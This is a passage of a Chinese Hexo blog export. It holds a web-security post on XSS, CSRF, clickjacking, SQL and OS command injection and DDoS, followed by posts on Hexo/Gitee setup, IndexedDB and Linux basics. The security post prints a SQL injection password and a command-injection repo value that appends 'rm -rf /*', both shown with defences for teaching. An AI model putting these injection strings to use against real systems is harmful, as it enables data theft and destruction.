    启用XSS过滤。如果检测到跨站脚本攻击，浏览器将清除⻚⾯并使⽤CSP report-uri 指令的功能发送违规报告。
2、ejs转义 
    &lt;% code %&gt;用于执行其中javascript代码
    &lt;%= code %&gt;会对code进行html转义
    &lt;%- code %&gt;将不会进行转义

3、CSP(Content Security Policy) 内容安全策略
    script-src:&#39;self-src&#39;

4、转义字符

5、黑名单和白名单
用户的输入永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜
杠进行转义富文本来说，显然不能通过上⾯的办法来转义所有字符，因为这样会把需要的格式也过滤掉。
对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过
滤的标签和标签属性实在太多，更加推荐使用白名单的方式

6、响应头部字段Set-Cookie 设置为HttpOnly  客户端就不能通过document.cookie访问到cookie了
    例如:
        res.setHeader(&#39;Set-Cookit&#39;,&#39;uid=123; HttpOnly&#39;)</code></pre>
<h5 id="2、CSRF攻击-跨站伪造请求–cross-site-request-forgery"><a href="#2、CSRF攻击-跨站伪造请求–cross-site-request-forgery" class="headerlink" title="2、CSRF攻击(跨站伪造请求–cross site request forgery)"></a>2、CSRF攻击(跨站伪造请求–cross site request forgery)</h5><p>利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
<pre><code>1、用户已经登录了站点 A，并在本地记录了 cookie
2、在用户没有登出站点 A 的情况下（也就是 cookie 有效的情况下），访问了恶意攻击者提供的引
诱危险站点 B (B 站点要求访问站点A)。
3、站点 A 没有做任何 CSRF 防御

CSRF的危害：
    1、利用用户登录态
    2、用户不知情
    3、完成业务请求
    4、盗取用户资金（转账，消费）
    5、冒充用户发帖背锅
    6、损害用站声誉

防御手段:
    1、referer check  校验来源  但是https不显示referer 而且可伪造
    2、验证码(最有效)</code></pre>
<h5 id="3、点击劫持-clickjacking"><a href="#3、点击劫持-clickjacking" class="headerlink" title="3、点击劫持(clickjacking)"></a>3、点击劫持(clickjacking)</h5><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式式嵌入自己<br>的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击</p>
<pre><code>通过视觉欺骗手段将引诱点击的按钮和iframe的网站提交按钮重叠

防御手段：
1、响应头字段X-IFRAME-OPTIONS
    DENY,表示页面不允许通过iframe的方式展示
    SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示
    ARROW-FROM，表示页面可以在指定来源的iframe中显示

    res.setHeader(&#39;X-FRAME-OPTIONS&#39;,&#39;DENY)

    防御用 iframe 嵌套的点击劫持攻击

2、JS方式(古老的手段)
    判断self是否和top相等
    如果相等，则没事，
    如果不相等，则为通过iframe来访问的，
    让top.location=self.location</code></pre>
<h5 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="4、SQL注入"></a>4、SQL注入</h5><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
<p>例如特殊”密码”：1’or’1’=’1’</p>
<pre><code>// 拼接后的SQL
SELECT *
FROM test.user
WHERE username = &#39;laowang&#39;
AND password = &#39;1&#39;or&#39;1&#39;=&#39;1&#39;

用or达到一个怎么都正确的结果

防御手段:
1、所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户
输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的
query 方法中的 ? 占位参数。
2、严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而
最大限度的减少注入攻击对数据库的危害
3、后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些
匹配处理。
4、对进入数据库的特殊字符（&#39;， &quot;， \， &lt;， &gt;， &amp;， *， ; 等）进行转义处理，或编码转换**。基本上
所有的后端语言都有对字符串进行转义处理的方法，例如 lodash 的 lodash._escapehtmlchar
库</code></pre>
<h5 id="5、OS注入"><a href="#5、OS注入" class="headerlink" title="5、OS注入"></a>5、OS注入</h5><pre><code>和SQL差不多，不过是针对操作系统的
// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo
const exec = require(&#39;mz/child_process&#39;).exec;
let params = &#123;/* 用户输入的参数 */&#125;;
exec(`git clone $&#123;params.repo&#125; /some/path`);

https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</code></pre>
<h5 id="6、请求劫持"><a href="#6、请求劫持" class="headerlink" title="6、请求劫持"></a>6、请求劫持</h5><ul>
<li><p>DNS劫持</p>
<blockquote>
<p>顾名思义， DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip</p>
</blockquote>
</li>
<li><p>HTTP劫持 </p>
<blockquote>
<p>运营商劫持，此时大概只能升级HTTPS了</p>
</blockquote>
<p>  防御手段：    </p>
<pre><code>  使用https安全协议</code></pre>
</li>
</ul>
<h5 id="7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service"><a href="#7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service" class="headerlink" title="7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)"></a>7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)</h5><p>DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。</p>
<pre><code>其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承
受量，导致宕机。

防御手段：
    1、备份网站
    备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公
    告，告诉用户，网站出了问题，正在全力抢修。
    2、HTTP 请求的拦截
    3、硬件 服务器 防火墙
    - 带宽扩容 + CDN
    提高犯罪成本</code></pre>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Hexo和Gitee Pages搭建个人博客</title>
    <url>/2020/09/05/%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
<p>最近想捣鼓一下个人博客，以用来承载自己的一些想法，记录自己的成长，于是想到了用Hexo+GiteePages来搭建自己的个人博客。Hexo是一款快速、简洁且高效的博客框架，而选择Gitee Pages是因为Gitee是国内代码托管平台，访问速度比Github要快。</p>
</blockquote>
<a id="more"></a>

<p><a href="https://hexo.io/">Hexo官网</a></p>
<p><a href="https://gitee.com/help/articles/4136">GiteePages文档</a></p>
<h4 id="1、Hexo安装"><a href="#1、Hexo安装" class="headerlink" title="1、Hexo安装"></a>1、Hexo安装</h4><p>安装Hexo需要用到node.js，这里默认已经安装好了node环境。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<h4 id="2、初始化你的博客文件夹"><a href="#2、初始化你的博客文件夹" class="headerlink" title="2、初始化你的博客文件夹"></a>2、初始化你的博客文件夹</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hexo init your_blog   <span class="comment">//your_blog为你的文件夹名称</span></span><br></pre></td></tr></table></figure>

<h4 id="3、进入该目录并启动服务"><a href="#3、进入该目录并启动服务" class="headerlink" title="3、进入该目录并启动服务"></a>3、进入该目录并启动服务</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cd your_blog</span><br><span class="line">hexo s		<span class="comment">//s为server的缩写	hexo s 等价于 hexo server</span></span><br></pre></td></tr></table></figure>

<p>如果你的控制台有以下输出,证明博客已经启动。可以打开<code>localhost:4000</code>来访问站点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http:<span class="comment">//localhost:4000 . Press Ctrl+C to stop.</span></span><br></pre></td></tr></table></figure>

<h4 id="4、在Gitee上面新增仓库"><a href="#4、在Gitee上面新增仓库" class="headerlink" title="4、在Gitee上面新增仓库"></a>4、在Gitee上面新增仓库</h4><p>仓库名称和用户名相同，以使用GiteePages服务</p>
<h4 id="5、清除缓存"><a href="#5、清除缓存" class="headerlink" title="5、清除缓存"></a>5、清除缓存</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<h4 id="6、生成静态资源并部署"><a href="#6、生成静态资源并部署" class="headerlink" title="6、生成静态资源并部署"></a>6、生成静态资源并部署</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<h4 id="7、部署配置"><a href="#7、部署配置" class="headerlink" title="7、部署配置"></a>7、部署配置</h4><p>在项目目录下有一个<code>_config.yml</code>文件，站点的相关配置都在这里进行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@gitee.com:you_account/you_account.git <span class="comment">//配置你的仓库，我这里使用的是Gitee上面的仓库</span></span><br></pre></td></tr></table></figure>

<h4 id="8、启用Gitee-Pages服务"><a href="#8、启用Gitee-Pages服务" class="headerlink" title="8、启用Gitee Pages服务"></a>8、启用Gitee Pages服务</h4><p>点击仓库服务按钮，启动Gitee Pages服务<br>此时再访问 <a href="https://your-account.gitee.io/">https://your-account.gitee.io</a> 这个网址就能访问你的博客了。</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器数据库IndexDB入门</title>
    <url>/2020/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE%E5%BA%93IndexDB%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>现在经常遇到一些场景，需要在浏览器客户端存储大量的数据，这样就可以不用从服务器获取数据，直接在本地进行读取操作。而浏览器提供的本地存储方案有Cookie,LocalStorage,SessionStorage,IndexDB等。</p>
</blockquote>
<a id="more"></a>

<h5 id="1、方案对比"><a href="#1、方案对比" class="headerlink" title="1、方案对比"></a>1、方案对比</h5><ul>
<li><p>Cookie</p>
<ul>
<li>限制大小不超过4k</li>
<li>每次请求都会携带在请求头，造成一定的资源浪费</li>
</ul>
</li>
<li><p>LocalStorage</p>
<ul>
<li>存储大小据浏览器而定，但是比Cookie大了不少</li>
<li>不能建立自定义索引</li>
<li>同步执行</li>
</ul>
</li>
<li><p>IndexDB</p>
<ul>
<li>浏览器提供的本地数据库</li>
<li>支持键值对存储</li>
<li>异步执行，IndexDB操作时不会锁死浏览器，这样设计是为了防止大量数据的读写，造成页面卡顿</li>
<li>存储空间非常大</li>
<li>支持二进制存储 </li>
</ul>
</li>
</ul>
<p>基于以上的方案对比，如果是涉及到大数据量的存储的，选择IndexDB是相对比较好的解决方案。</p>
<h5 id="2、IndexDB的关键概念"><a href="#2、IndexDB的关键概念" class="headerlink" title="2、IndexDB的关键概念"></a>2、IndexDB的关键概念</h5><p>IndexDB是一个事务性数据库系统，基于Javascript的面向对象数据库。使用IndexDB执行的操作是异步执行的，以免阻塞应用程序。</p>
<h5 id="3、IndexDB的使用"><a href="#3、IndexDB的使用" class="headerlink" title="3、IndexDB的使用"></a>3、IndexDB的使用</h5><h6 id="3-1、打开数据库"><a href="#3-1、打开数据库" class="headerlink" title="3.1、打开数据库"></a>3.1、打开数据库</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> IDBRequest = <span class="built_in">window</span>.indexDB.open(<span class="string">&#x27;database_name&#x27;</span>,version);</span><br></pre></td></tr></table></figure>

<p><code>window.indexDB.open</code>方法接受的两个参数分别是数据库名称和版本号，一个是字符串，一个是整数。方法返回一个<code>IDBRequest</code>对象，是一个处理数据库请求并提供对结果访问的通用接口，该对象通过监听<code>error    </code>、<code>success</code>、<code>upgradeneeded</code>三个事件来进行一系列相关的操作。</p>
<ul>
<li><p><code>error</code>事件</p>
<p>该事件表示打开数据库失败。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">IDBRequest.onerror = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;打开数据库失败&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>success</code>事件<br>该事件表示打开数据库成功</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">IDBRequest.onsuccess = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;打开数据库失败&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>upgradeneeded事件<br>该事件表示指定的版本号如果大于数据库的实际版本号，发生数据库升级事件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> db;</span><br><span class="line">IDBRequest.onupgradeneeded = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    db = event.target.result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回调方法内通过<code>event.target.result</code>拿到数据库实例</p>
</li>
</ul>
<h6 id="3-2、新建数据库"><a href="#3-2、新建数据库" class="headerlink" title="3.2、新建数据库"></a>3.2、新建数据库</h6><p>新建数据库和打开数据库类似，代码如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> _db_instance = <span class="literal">null</span>;<span class="comment">// 数据库对象</span></span><br><span class="line"><span class="keyword">let</span> myDB = &#123;</span><br><span class="line">    name:<span class="string">&#x27;test_database&#x27;</span>,<span class="comment">// 数据库名称</span></span><br><span class="line">    version:<span class="number">1</span><span class="comment">// 数据库版本</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建数据库方法</span></span><br><span class="line"><span class="keyword">const</span> createDB = <span class="function">(<span class="params">name, version</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> IDBRequest = <span class="built_in">window</span>.indexDB.open(name,version);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 监听error事件</span></span><br><span class="line">    IDBRequest.onerror = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;打开数据库失败&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 监听success事件</span></span><br><span class="line">    IDBRequest.onerror = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 这步之后就能通过_db_instance来访问IndexDB了</span></span><br><span class="line">        _db_instance = event.target.result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">createDB(myDB.name,myDB.version);</span><br></pre></td></tr></table></figure>



<h6 id="3-3、关闭数据库"><a href="#3-3、关闭数据库" class="headerlink" title="3.3、关闭数据库"></a>3.3、关闭数据库</h6><p>通过数据库对象的close方法来关闭数据库</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_db_instance.close();</span><br></pre></td></tr></table></figure>



<h6 id="3-4、删除数据库"><a href="#3-4、删除数据库" class="headerlink" title="3.4、删除数据库"></a>3.4、删除数据库</h6><p>通过调用indexedDB对象的deleteDatabase方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.indexedDB.deleteDatabase(name);</span><br></pre></td></tr></table></figure>



<h6 id="3-5、新增对象存储空间"><a href="#3-5、新增对象存储空间" class="headerlink" title="3.5、新增对象存储空间"></a>3.5、新增对象存储空间</h6><p><code>IndexDB</code>使用对象存储空间而不是表，一个单独的数据库可以包含任意数量的对象存储空间。每当一个值被存储进一个对象存储空间时，它会被和一个键相关联。键的提供可以有几种不同的方法，这取决于对象存储空间是使用 key path 还是 key generator。</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!_db_instance.objectStoreNames.contains(<span class="string">&#x27;test&#x27;</span>))&#123;</span><br><span class="line">   <span class="keyword">let</span> objStore = _db_instance.createObjectStore(<span class="string">&#x27;test&#x27;</span>,&#123;<span class="attr">keyPath</span>:<span class="string">&#x27;testid&#x27;</span>&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主键是默认建立索引的属性。</p>
<ul>
<li><p>假如数据记录是<code>&#123;id:1,name:&#39;test_name&#39;&#125;</code>,那么id可以作为主键</p>
</li>
<li><p>假如数据记录是<code>&#123;obj:&#123;obj_id:1&#125;,name:&#39;test_name&#39;&#125;</code>，那么也可以设置下一层属性<code>obj.obj_id</code>作为主键</p>
</li>
<li><p>如果数据记录里面没有合适作为主键的属性，那么可以让 <code>IndexedDB </code>自动生成主键</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> objStore = _db_instance.createObjectStore(</span><br><span class="line">  <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">  &#123; <span class="attr">autoIncrement</span>: <span class="literal">true</span> &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h6 id="3-6、新建索引"><a href="#3-6、新建索引" class="headerlink" title="3.6、新建索引"></a>3.6、新建索引</h6><p>新建对象存储空间后可以新建索引</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.createIndex(<span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;test1&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">objStore.createIndex(<span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;test2&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>上面对象存储仓库对象的<code>createIndex</code>方法三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值)</p>
<h6 id="3-7、新增事务"><a href="#3-7、新增事务" class="headerlink" title="3.7、新增事务"></a>3.7、新增事务</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> transition = _db_instance.transaction(<span class="string">&#x27;test&#x27;</span>, model);  <span class="comment">// model可以为只读readonly或者读写readwrite</span></span><br></pre></td></tr></table></figure>



<h6 id="3-8、新增数据"><a href="#3-8、新增数据" class="headerlink" title="3.8、新增数据"></a>3.8、新增数据</h6><p>通过<code>add()</code>方法添加数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> transition = _db_instance.transaction([<span class="string">&#x27;test&#x27;</span>], model);</span><br><span class="line"><span class="keyword">let</span> objStore = transition.objectStore(<span class="string">&#x27;test1&#x27;</span>);</span><br><span class="line">objStore.add(&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span>, <span class="attr">email</span>: <span class="string">&#x27;zhangsan@example.com&#x27;</span> &#125;);</span><br></pre></td></tr></table></figure>



<h6 id="3-9、删除数据"><a href="#3-9、删除数据" class="headerlink" title="3.9、删除数据"></a>3.9、删除数据</h6><p>通过<code>delete()</code>方法删除数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.delete(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<h6 id="3-10、更新数据"><a href="#3-10、更新数据" class="headerlink" title="3.10、更新数据"></a>3.10、更新数据</h6><p>通过<code>put()</code>方法更新数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.put(&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>, <span class="attr">age</span>: <span class="number">35</span>, <span class="attr">email</span>: <span class="string">&#x27;lisi@example.com&#x27;</span> &#125;)</span><br></pre></td></tr></table></figure>



<h6 id="3-11、读取数据"><a href="#3-11、读取数据" class="headerlink" title="3.11、读取数据"></a>3.11、读取数据</h6><p>通过<code>get()</code>方法读取数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.get(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<h6 id="3-12、使用索引"><a href="#3-12、使用索引" class="headerlink" title="3.12、使用索引"></a>3.12、使用索引</h6><p>假设新建对象存储空间的时候对<code>test1</code>字段建立了索引。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.createIndex(<span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;test1&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>现在，就可以从<code>test1</code>找到对应的数据记录了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> transition = _db_instance.transaction([<span class="string">&#x27;test&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> objStore transaction.objectStore(<span class="string">&#x27;test1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = objStore.index(<span class="string">&#x27;test1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> request = index.get(<span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line"></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = e.target.result;</span><br><span class="line">  <span class="keyword">if</span> (result) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>本地存储，IndexDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux基础知识点整理</title>
    <url>/2020/09/12/Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>Linux，全称GNU/Linux，是一套免费使用和自由传播的类UNIX操作系统。是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统，能运行主要的 UNIX 工具软件、应用程序和网络协议，Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p>
</blockquote>
<a id="more"></a>

<h5 id="1、Linux比较流行的发行版"><a href="#1、Linux比较流行的发行版" class="headerlink" title="1、Linux比较流行的发行版"></a>1、Linux比较流行的发行版</h5><ul>
<li><p>Slackware</p>
<blockquote>
<p>最早的Linux发行版中的一员，在Linux极客中比较流行</p>
</blockquote>
</li>
<li><p>Red Hat</p>
<blockquote>
<p>主要用于Internet服务器的商业发行版，性能稳定</p>
</blockquote>
</li>
<li><p>RHEL</p>
<blockquote>
<p>Red Hat的企业版</p>
</blockquote>
</li>
<li><p>Fedora</p>
<blockquote>
<p>从Red Hat分离出的社区免费版</p>
</blockquote>
</li>
<li><p>CentOS</p>
<blockquote>
<p>算是RHEL的克隆版，免费。结合了RHEL和Fedora的特性，兼具Community(社区)和Enterprise(企业)的特性，稳定，每个版本一般都有长期的支持(10年)，适合做服务器</p>
</blockquote>
</li>
<li><p>Deepin</p>
<blockquote>
<p>中国发行。对优秀的开源产品进行集成和配置，开发软件</p>
</blockquote>
</li>
<li><p>Gentoo</p>
<blockquote>
<p>为高级Linux用户设计的发行版，仅包含Linux源代码</p>
</blockquote>
</li>
<li><p>openSUSE</p>
<blockquote>
<p>用于商用和家用的发行版</p>
</blockquote>
</li>
<li><p>Debian</p>
<blockquote>
<p>在Linux专家和商用Linux产品中流行的发行版，迄今为止，最遵循GNU规范的Linux系统</p>
</blockquote>
</li>
<li><p>Ubuntu</p>
<blockquote>
<p>Debian的后继或一个分支</p>
</blockquote>
</li>
</ul>
<h5 id="2、命令行相关操作"><a href="#2、命令行相关操作" class="headerlink" title="2、命令行相关操作"></a>2、命令行相关操作</h5><h6 id="1、查找命令和命令的历史记录"><a href="#1、查找命令和命令的历史记录" class="headerlink" title="1、查找命令和命令的历史记录"></a>1、查找命令和命令的历史记录</h6><ul>
<li>查找命令<ul>
<li><code>Tab</code>键：可以补全命令，也可以补全文件名、路径名，按两次Tab键即可</li>
</ul>
</li>
<li>命令的历史记录<ul>
<li><code>↑</code>键：按时间顺序向前查找用过的命令，每按一次就前进一个命令</li>
<li><code>↓</code>键：按时间顺序向后查找用过的命令，没按一次就前进一个命令</li>
<li><code>Ctrl + R</code>：用于查找使用过的命令</li>
<li><code>history</code>命令：用于列出之前使用过的所有命令，可以用<code>!编号</code>这样的格式来重新运行history输出中对应编号的命令</li>
</ul>
</li>
</ul>
<h6 id="2、一些使用的快捷键"><a href="#2、一些使用的快捷键" class="headerlink" title="2、一些使用的快捷键"></a>2、一些使用的快捷键</h6><ul>
<li><code>Ctrl + L</code>：用于清理终端的内容，清屏，和<code>clear</code>命令一样</li>
<li><code>Ctrl + D</code>：给终端传递EOF（End Of File，文件结束符） </li>
<li><code>Shift + PgUp</code>：用于向上滚屏，与鼠标的滚轮向上滚屏是一个效果</li>
<li><code>Shift + PgDn</code>：用于向下滚屏，与鼠标的滚轮向下滚屏是一个效果</li>
<li><code>Ctrl + A</code>：光标跳到一行命令的开头，Home键有相同的效果</li>
<li><code>Ctrl + E</code>：光标跳到一行命令的结尾，End键有相同的效果</li>
<li><code>Ctrl + U</code>：删除所在光标的左侧的所有命令字符</li>
<li><code>Ctrl + K</code>：删除所在光标的右侧的所有命令字符  </li>
<li><code>Ctrl + W</code>：删除所在光标的左侧的一个单词，即使用空格隔开的字符串 </li>
</ul>
<h6 id="3、Linux中的文件"><a href="#3、Linux中的文件" class="headerlink" title="3、Linux中的文件"></a>3、Linux中的文件</h6><blockquote>
<p>Linux中一切都是文件</p>
</blockquote>
<ul>
<li><p>普通文件</p>
<ul>
<li>文本类型的文件（.txt,.doc,.odt等）</li>
<li>声音文件（.wav,.mp3,.ogg）,还有程序等</li>
</ul>
</li>
<li><p>特殊文件</p>
<ul>
<li>光盘驱动器</li>
</ul>
</li>
</ul>
<h6 id="4、Linux的目录"><a href="#4、Linux的目录" class="headerlink" title="4、Linux的目录"></a>4、Linux的目录</h6><p>目录基础概念：</p>
<blockquote>
<p>Linux有且只有一个根目录，就是<code>/</code>。</p>
<p>Linux中没有比根目录再高一阶的目录了，没有目录包含根目录。</p>
<p>Linux中用斜杠<code>/</code>来标明目录的层级与包含关系。</p>
<p>目录形式是这样的 <code>/usr/bin</code>，<code>bin</code>是<code>usr</code>目录的子目录，<code>usr</code>是<code>/</code>这个根目录的子目录</p>
</blockquote>
<p>目录组织：</p>
<ul>
<li><code>bin</code>：英语binary的缩写，表示“二进制文件”，可执行文件时二进制的，该目录包含了会被所有用户使用的可执行程序</li>
<li><code>boot</code>：英语boot表示“启动”，该目录包含于Linux启动密切相关的文件</li>
<li><code>dev</code>：英语device的缩写，表示“设备”，该目录包含外设，它里面的子目录，每一个对应一个外设，比如代表光盘驱动器的文件就会出现在这个目录下面 </li>
<li><code>etc</code>：该目录包含系统的配置文件</li>
<li><code>home</code>：用户的私人目录 ，Linux中的每个用户都在home目录下有一个私人目录，假设用户的用户名是test_name,那么他的私人目录就是<code>/home/test_name</code></li>
<li><code>lib</code>：英语library的缩写，表示库，该目录包含被程序所调用的库文件，例如.so结尾的文件</li>
<li><code>media</code>：英语media表示“媒体”，可移动的外设（USB盘，SD卡，DVD，光盘，等等）插入电脑时，我们可以通过<code>media</code>的子目录来访问这些外设中的内容</li>
<li><code>mnt</code>：英语mount的缩写，表示“挂载”，类似<code>media</code>目录，但一般用于临时挂载一些装置</li>
<li><code>opt</code>：英语optional application software package的缩写，表示“可选的英语软件包” ，用于安装多数第三方软件和插件</li>
<li><code>root</code>：超级用户root的家目录，一般用户的家目录位于<code>/home</code>下，root用户例外</li>
<li><code>sbin</code>：英语system binary的缩写，表示“系统二进制文件”，比<code>bin</code>目录多了一个前缀system（“系统”），该目录包含系统级的重要可执行程序</li>
<li><code>tmp</code>：英语temporary的缩写，表示“临时的”，是普通用户和程序存放临时文件的地方</li>
<li><code>srv</code>：英语service的缩写，表示“服务”，该目录包含一些网络服务启动之后所需要取用的数据</li>
<li><code>usr</code>：英语Unix Software Resource的缩写，表示”Unix操作系统软件资源”，类似<code>etc</code>，是历史遗留的命名，<code>usr</code>目录是最庞大的目录之一，安装了大部分用户要调用的程序</li>
<li><code>var</code>：英语variable的缩写，表示”动态的，可变的“，通常包含程序的数据，比如log（日志）文件，log文件记录电脑中发生了什么事</li>
</ul>
<p>目录相关命令：</p>
<ul>
<li><p><code>pwd</code>：显示当前目录的路径</p>
</li>
<li><p><code>which</code>：获取命令的可执行文件的位置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">which pwd <span class="comment">//获取pwd命令的可执行文件的位置</span></span><br><span class="line"></span><br><span class="line">/usr/bin/pwd</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>ls</code>：列出文件和目录</p>
